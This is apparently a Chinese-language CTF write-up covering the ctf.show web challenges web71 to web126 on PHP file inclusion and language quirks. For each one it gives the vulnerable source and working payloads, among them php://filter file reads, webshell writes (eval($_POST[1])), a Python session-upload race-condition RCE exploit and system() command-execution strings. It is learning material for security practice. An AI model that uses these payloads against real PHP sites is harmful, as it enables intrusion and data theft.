preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 做这个题的时候思路走偏了，一直想着用convert编码方式绕过。 payload： 1c&#x3D;include(&#39;flag.txt&#39;);exit(); 还有一个更牛逼的 1c&#x3D;include(&#39;flag.txt&#39;);echo ~ob_get_content(); 然后再对每个字符&amp;0xff再取反。 **web72 代码和上一道题是一样的。 还是不会，找个wp瞅瞅学一学。 web入门 文件包含 web78 最简单的文件包含利用 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php web79 12345678&lt;?php if(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 可以通过UserAgent写shell 然后再包含日志文件 不过也还可以用data伪协议写入webshell。 web80 123456789&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 这次过滤了data和php，但是还是可以通过大小写Php://input绕过 web81 12345678910&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); include($file);&#125;else&#123; highlight_file(__FILE__);&#125; 第一种解法同web79。 第二种解法是通过session.upload_progress和条件竞争GetShell，exp： 12345678910111213141516171819202122232425262728293031323334353637import requestsimport ioimport threadingurl = &quot;&quot;&quot;http://15b479e2-6c40-4f72-a293-5562a7523e29.chall.ctf.show/&quot;&quot;&quot;sessid = &quot;ca01h&quot;cookie = &#123; &quot;PHPSESSID&quot;: sessid&#125;proxy = &#123;&quot;http&quot;: &quot;127.0.0.1:8080&quot;&#125;def write(session): while True: files = &#123; &quot;upload&quot;: io.BytesIO(b&#x27;a&#x27; * 1024) &#125; data = &#123; &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;: &quot;&lt;?php system(&#x27;ls&#x27;);echo &#x27;ca01h&#x27;;?&gt;&quot; &#125; session.post(url=url, files=files, data=data, cookies=cookie)def read(session): while True: req = session.get(url=url+&#x27;?file=/tmp/sess_&#x27;+sessid) if &#x27;ca01h&#x27; in req.text: print(req.text) else: passfor i in range(50): with requests.session() as session: threading.Thread(target=write, args=(session,)).start() threading.Thread(target=read, args=(session,)).start() web82-86 https://ca0y1h.top/Web_security/php_related/13.session.upload_progress+LFI实现RCE/ 其中web85 123456789101112131415161718&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); if(file_exists($file))&#123; $content = file_get_contents($file); if(strpos($content, &quot;&lt;&quot;)&gt;0)&#123; die(&quot;error&quot;); &#125; include($file); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; **web87[TODO] 123456789101112&lt;?phpif(isset($_GET[&#x27;file&#x27;]))&#123; $file = $_GET[&#x27;file&#x27;]; $content = $_POST[&#x27;content&#x27;]; $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file); $file = str_replace(&quot;.&quot;, &quot;???&quot;, $file); file_put_contents(urldecode($file), &quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;.$content);&#125;else&#123; highlight_file(__FILE__);&#125; 参考文章：https://www.leavesongs.com/PENETRATION/php-filter-magic.html 思路：两次URLencode编码绕过过滤，php://filter绕过死亡退出，其中有两种方法都可以bypass。 第一种方法使用base64 decode编码 1php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;a.php 第二种方法使用strip_tags，但是PHP版本太高，strip_tags已经不让用了。 web入门 PHP特性 web89 12345678910111213&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 数组绕过 1?num[]&#x3D;1 web90 1234567891011121314&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 小数点或字母绕过 12?num&#x3D;4476a?num&#x3D;4476.1 web91 123456789101112131415&lt;?phpshow_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$/i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125; 换行符绕过 1?cmd&#x3D;%0aphp web92 1234567891011121314&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 小数点绕过 1?num&#x3D;4476.1 科学计数法绕过 1234&lt;?phpvar_dump(&#x27;4476e1&#x27;==4476); // bool(false)var_dump(&#x27;4476e1&#x27;==44760); // bool(true)var_dump(intval(&#x27;4476e1&#x27;)); // int(44760) web93 1234567891011121314151617&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)==4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0); &#125;&#125; 小数点绕过 1?num&#x3D;4476.1 web94 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]/i&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 小数点绕过 1?num&#x3D;4476.0 web95 123456789101112131415161718&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num==4476)&#123; die(&quot;no no no!&quot;); &#125; if(preg_match(&quot;/[a-z]|\\./i&quot;, $num))&#123; die(&quot;no no no!!&quot;); &#125; if(!strpos($num, &quot;0&quot;))&#123; die(&quot;no no no!!!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;&#125; 用八进制绕过，又由于0不能出现在第一个字符，可以用空格或+绕过。 1?num&#x3D;+10574 web96 12345678910&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#x27;u&#x27;]))&#123; if($_GET[&#x27;u&#x27;]==&#x27;flag.php&#x27;)&#123; die(&quot;no no no&quot;); &#125;else&#123; highlight_file($_GET[&#x27;u&#x27;]); &#125;&#125; 1?u&#x3D;.&#x2F;flag.php web97 1234567891011&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);if (isset($_POST[&#x27;a&#x27;]) and isset($_POST[&#x27;b&#x27;])) &#123;if ($_POST[&#x27;a&#x27;] != $_POST[&#x27;b&#x27;])if (md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;]))echo $flag;elseprint &#x27;Wrong.&#x27;;&#125;?&gt; md5强等号用数组绕过，返回NULL 1a[]&#x3D;1&amp;b[]&#x3D;2 web98 12345678&lt;?phpinclude(&quot;flag.php&quot;);$_GET?$_GET=&amp;$_POST:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_COOKIE:&#x27;flag&#x27;;$_GET[&#x27;flag&#x27;]==&#x27;flag&#x27;?$_GET=&amp;$_SERVER:&#x27;flag&#x27;;highlight_file($_GET[&#x27;HTTP_FLAG&#x27;]==&#x27;flag&#x27;?$flag:__FILE__);?&gt; 一开始没太看懂这个题目的意思，后来百度才知道PHP的&amp;也有引用的功能。 所以第二行代码的意思就是：如果存在GET请求则引用POST请求的内容，否则$_GET='flag'。 payload： 12?a&#x3D;POST HTTP_FLAG&#x3D;flag **web99 12345678910&lt;?phphighlight_file(__FILE__);$allow = array();for ($i=36; $i &lt; 0x36d; $i++) &#123; array_push($allow, rand(1,$i));&#125;if(isset($_GET[&#x27;n&#x27;]) &amp;&amp; in_array($_GET[&#x27;n&#x27;], $allow))&#123; file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);&#125;?&gt; 这里考察in_array函数的特性 12345&lt;?php$allow1 = array(10,20);var_dump(in_array(&#x27;10.php&#x27;,$allow1)); // bool(true)$allow2 = array(&#x27;a&#x27;,&#x27;b&#x27;);var_dump(in_array(0,$allow2)); // bool(true) 由于该函数并未将第三个参数设置为 true ，这导致攻击者可以通过构造的文件名来绕过服务端的检测，例如文件名为 7shell.php 。因为PHP在使用 in_array() 函数判断时，会将 7shell.php 强制转换成数字7，而数字7在 range(1,24) 数组中，最终绕过 in_array() 函数判断， payload 12?n&#x3D;10.phpcontent&#x3D;&lt;?php eval($_POST[1]);?&gt; web100 1234567891011121314151617&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\;/&quot;, $v2))&#123; if(preg_match(&quot;/\\;/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; Payload: 1?v1&#x3D;1&amp;v2&#x3D;?&gt;&lt;?&#x3D;&#96;cat ctfshow.php&#96;?&gt;&amp;v3&#x3D;; 还可以使用get_class_vars()函数获取类属性： 1?v1&#x3D;1&amp;v2&#x3D;get_class_vars&amp;v3&#x3D;); **web101 123456789101112131415161718&lt;?phphighlight_file(__FILE__);include(&quot;ctfshow.php&quot;);//flag in class ctfshow;$ctfshow = new ctfshow();$v1=$_GET[&#x27;v1&#x27;];$v2=$_GET[&#x27;v2&#x27;];$v3=$_GET[&#x27;v3&#x27;];$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);if($v0)&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|[0-9]/&quot;, $v2))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\&#123;|\\[|\\&quot;|\\&#x27;|\\,|\\.|\\?|[0-9]/&quot;, $v3))&#123; eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;); &#125; &#125; &#125;?&gt; PHP获取类属性的几种方法：https://my.oschina.net/u/3544550/blog/1489826 这里是使用反射API，payload： 1?v1&#x3D;1&amp;v2&#x3D;echo(new ReflectionClass&amp;v3&#x3D;); **web102 12345678910111213141516&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; file_put_contents($v3,$str);&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 思路不太好想，PHP5的版本下payload： 1234GET: ?v2&#x3D;0x3c3f3d60746163202a603b3f3e&amp;v3&#x3D;sh.phpPOST: v1&#x3D;hex2binecho hex2bin(&#39;3c3f3d60746163202a603b3f3e&#39;) \\\\ &lt;?&#x3D;&#96;tac *&#96;;?&gt; 但是这个payload在php7下无法实现，主要原因是该版本的十六进制表示法中的字符串不再被视为数字字符串，即is_numeric（） 现在返回 FALSE。 所以这道题就有些脑洞了。 123456789构造需要写入文件的payload&lt;?&#x3D;&#96;cat *&#96;;使用base64编码后：PD89YGNhdCAqYDs使用bin2hex函数将字符串转成十六进制的内容：5044383959474e6864434171594473&#x2F;&#x2F;这里有个巧妙之处，刚好只有一个e，识别成了科学计数法，很顶而这里的v3也需要进行修改成伪协议的方式最后的Payload:GET:?v2&#x3D;115044383959474e6864434171594473&amp;v3&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.base64-decode&#x2F;resource&#x3D;sh.phpPOST:v1&#x3D;hex2bin 出题人：https://cnblogs.com/erR0Ratao/p/13731541.html web103 123456789101112131415161718192021&lt;?phphighlight_file(__FILE__);$v1 = $_POST[&#x27;v1&#x27;];$v2 = $_GET[&#x27;v2&#x27;];$v3 = $_GET[&#x27;v3&#x27;];$v4 = is_numeric($v2) and is_numeric($v3);if($v4)&#123; $s = substr($v2,2); $str = call_user_func($v1,$s); echo $str; if(!preg_match(&quot;/.*p.*h.*p.*/i&quot;,$str))&#123; file_put_contents($v3,$str); &#125; else&#123; die(&#x27;Sorry&#x27;); &#125;&#125;else&#123; die(&#x27;hacker&#x27;);&#125;?&gt; 同上 web104 123456789101112&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2))&#123; echo $flag; &#125;&#125;?&gt; 数组绕过 **web105 12345678910111213141516171819202122&lt;?phphighlight_file(__FILE__);include(&#x27;flag.php&#x27;);error_reporting(0);$error=&#x27;你还想要flag嘛？&#x27;;$suces=&#x27;既然你想要那给你吧！&#x27;;foreach($_GET as $key =&gt; $value)&#123; if($key===&#x27;error&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;foreach($_POST as $key =&gt; $value)&#123; if($value===&#x27;flag&#x27;)&#123; die(&quot;what are you doing?!&quot;); &#125; $$key=$$value;&#125;if(!($_POST[&#x27;flag&#x27;]==$flag))&#123; die($error);&#125;echo &quot;your are good&quot;.$flag.&quot;\\n&quot;;die($suces); 考察变量覆盖 12GET: ?suces&#x3D;flagPOST: error&#x3D;suces 或者 12GET: ?suces&#x3D;flag&amp;flag&#x3D;1POST flag&#x3D; Web106 123456789101112&lt;?phphighlight_file(__FILE__);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2)&#123; echo $flag; &#125;&#125;?&gt; 数组绕过 web107 1234567891011121314&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if(isset($_POST[&#x27;v1&#x27;]))&#123; $v1 = $_POST[&#x27;v1&#x27;]; $v3 = $_GET[&#x27;v3&#x27;]; parse_str($v1,$v2); if($v2[&#x27;flag&#x27;]==md5($v3))&#123; echo $flag; &#125;&#125;?&gt; 弱类型比较 12GET: ?v3&#x3D;byGcYPOST: v1&#x3D;flag&#x3D;0e00 parse_str ( string $encoded_string [, array &amp;$result ] ) : void 1encoded_string 输入的字符串。 1result 如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。 PHP7.2版本以上必须有result参数 web108 1234567891011121314&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#x27;c&#x27;])===FALSE) &#123; die(&#x27;error&#x27;);&#125;//只有36d的人才能看到flagif(intval(strrev($_GET[&#x27;c&#x27;]))==0x36d)&#123; echo $flag;&#125;?&gt; ereg存在%00截断 1?c&#x3D;a%00778 **web109 1234567891011highlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v1) &amp;&amp; preg_match(&#x27;/[a-zA-Z]+/&#x27;, $v2))&#123; eval(&quot;echo new $v1($v2());&quot;); &#125;&#125;?&gt; 据说这题目出的有点问题，但是我还是不知道Exception的构造函数可以执行代码。 1?v1&#x3D;Exception&amp;v2&#x3D;system(&#39;cat *&#39;) **web110 1234567891011121314151617&lt;?phphighlight_file(__FILE__);error_reporting(0);if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; eval(&quot;echo new $v1($v2());&quot;);&#125;?&gt; 利用 FilesystemIterator 获取指定目录下的所有文件。 1?v1&#x3D;FilesystemIterator&amp;v2&#x3D;getcwd 然后直接访问文件。 **web111 12345678910111213141516171819202122232425262728&lt;?phphighlight_file(__FILE__);error_reporting(0);include(&quot;flag.php&quot;);function getFlag(&amp;$v1,&amp;$v2)&#123; eval(&quot;$$v1 = &amp;$$v2;&quot;); var_dump($$v1);&#125;if(isset($_GET[&#x27;v1&#x27;]) &amp;&amp; isset($_GET[&#x27;v2&#x27;]))&#123; $v1 = $_GET[&#x27;v1&#x27;]; $v2 = $_GET[&#x27;v2&#x27;]; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v1))&#123; die(&quot;error v1&quot;); &#125; if(preg_match(&#x27;/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\&#123;|\\[|\\;|\\:|\\&quot;|\\&#x27;|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/&#x27;, $v2))&#123; die(&quot;error v2&quot;); &#125; if(preg_match(&#x27;/ctfshow/&#x27;, $v1))&#123; getFlag($v1,$v2); &#125;&#125;?&gt; 直接看payload吧。。使用全局变量来进行赋值： 1?v1&#x3D;ctfshow&amp;v2&#x3D;GLOBALS $GLOBALS — 引用全局作用域中可用的全部变量 一个包含了全部变量的全局组合数组。变量的名字就是数组的键。 $$v1 = &amp;$$v2等价于$ctfshow=&amp;$GLOBALS。 web112 12345678910111213141516&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/\\.\\.\\/|http|https|data|input|rot13|base64|string/i&#x27;,$file))&#123; die(&quot;hacker!&quot;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; is_file可以用伪协议绕过： 1234&lt;?phpvar_dump(is_file(&#x27;test.php&#x27;)); // bool(true)var_dump(is_file(&#x27;php://filter/convert.base64-encode/resource=test.php&#x27;)); // bool(false)var_dump(is_file(&#x27;file:///flag&#x27;)); // bool(true) 过滤base64、rot13和string编码，其实不用编码也行 PHP支持的字符编码https://www.php.net/manual/zh/mbstring.supported-encodings.php 1?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php 或者换一个编码方式： 1php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php 如果过滤了php和filter，可以换一种伪协议 1?file&#x3D;compress.zlib:&#x2F;&#x2F;flag.php web113 123456789101112131415&lt;?phphighlight_file(__FILE__);error_reporting(0);function filter($file)&#123; if(preg_match(&#x27;/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;; 可以用上一道题的payload。 也可以用伪协议配合多级符号链接的办法进行绕过。 1?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php web114 1234567891011121314151617&lt;?phperror_reporting(0);highlight_file(__FILE__);function filter($file)&#123; if(preg_match(&#x27;/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123; die(&#x27;hacker!&#x27;); &#125;else&#123; return $file; &#125;&#125;$file=$_GET[&#x27;file&#x27;];echo &quot;师傅们居然tql都是非预期 哼！&quot;;if(! is_file($file))&#123; highlight_file(filter($file));&#125;else&#123; echo &quot;hacker!&quot;;&#125; 1php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php **web115 12345678910111213141516171819202122&lt;?phpinclude(&#x27;flag.php&#x27;);highlight_file(__FILE__);error_reporting(0);function filter($num)&#123; $num=str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num=str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num;&#125;$num=$_GET[&#x27;num&#x27;];if(is_numeric($num) and $num!==&#x27;36&#x27; and trim($num)!==&#x27;36&#x27; and filter($num)==&#x27;36&#x27;)&#123; if($num==&#x27;36&#x27;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125;&#125;else&#123; echo &quot;hacker!!!&quot;;&#125; 主要考察trim绕过，从源码可以看出，过滤的空白字符少了一个\\f，用%0c过。并且，is_numeric函数开始判断之前，首先会跳过所有空白字符。 payload 1?num&#x3D;%0c36 web123 1234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?/&quot;, $c)&amp;&amp;$c&lt;=18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125; 第一个点在于PHP变量命名是不允许使用点号的，存在点号的参数出入后会被解析成下划线_。 yu22x师傅提到用Fuzz的方式暴力破解： 1234567891011121314151617181920212223242526&lt;?phpfunction curl($url,$data)&#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_POST, 1); curl_setopt($ch, CURLOPT_POSTFIELDS, $data); $response = curl_exec($ch); curl_close($ch); return strlen($response);&#125;$url=&quot;http://127.0.0.1/test.php&quot;;for ($i=0; $i &lt;=128 ; $i++) &#123; for ($j=0; $j &lt;=128 ; $j++) &#123; $data=&quot;CTF&quot;.urlencode(chr($i)).&quot;SHOW&quot;.urlencode(chr($j)).&quot;COM&quot;.&quot;=123&quot;; if(curl($url,$data)!=0)&#123; echo $data.&quot;\\n&quot;; &#125; &#125; &#125;//test.php&lt;?phpif(isset($_POST[&#x27;CTF_SHOW.COM&#x27;]))&#123; echo 123;&#125; 发现CTF[SHOW.COM是可以绕过的。 第二个知识点： 123456789101112131、cli模式（命令行）下第一个参数$_SERVER[&#39;argv&#39;][0]是脚本名，其余的是传递给脚本的参数2、web网页模式下在web页模式下必须在php.ini开启register_argc_argv配置项 设置register_argc_argv &#x3D; On(默认是Off)，重启服务，$_SERVER[‘argv’]才会有效果这时候的$_SERVER[‘argv’][0] &#x3D; $_SERVER[‘QUERY_STRING’]$argv,$argc在web模式下不适用 相当于$a[0]=$_SERVER['QUERY_STRING']，所以payload： 12get: $fl0g&#x3D;flag_give_me;post: CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0]) 再来一个非预期解 1post: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;echo $flag 预期解： 12get: a&#x3D;1+fl0g&#x3D;flag_give_mepost: CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;parse_str($a[1]) 1234567&lt;?php$a=$_SERVER[&#x27;argv&#x27;];var_dump($a);//传入 a=1+fl0g=flag_give_me//结果如下array(2) &#123; [0]=&gt; string(3) &quot;a=1&quot; [1]=&gt; string(17) &quot;fl0g=flag_give_me&quot; &#125; web125 123456789101112131415&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; if(!preg_match(&quot;/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\&#123;|\\&#125;|\\&quot;|\\&#x27;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i&quot;, $c)&amp;&amp;$c&lt;=16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g===&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125;&#125;?&gt; Payload: 12get: $fl0g&#x3D;flag_give_me;post: CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0]) 预期解： 12GET:?1&#x3D;flag.phpPOST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;highlight_file($_GET[1]) web126 1234567891011121314&lt;?phperror_reporting(0);highlight_file(__FILE__);include(&quot;flag.php&quot;);$a=$_SERVER[&#x27;argv&#x27;];$c=$_POST[&#x27;fun&#x27;];if(isset($_POST[&#x27;CTF_SHOW&#x27;])&amp;&amp;isset($_POST[&#x27;CTF_SHOW.COM&#x27;])&amp;&amp;!isset($_GET[&#x27;fl0g&#x27;]))&#123; 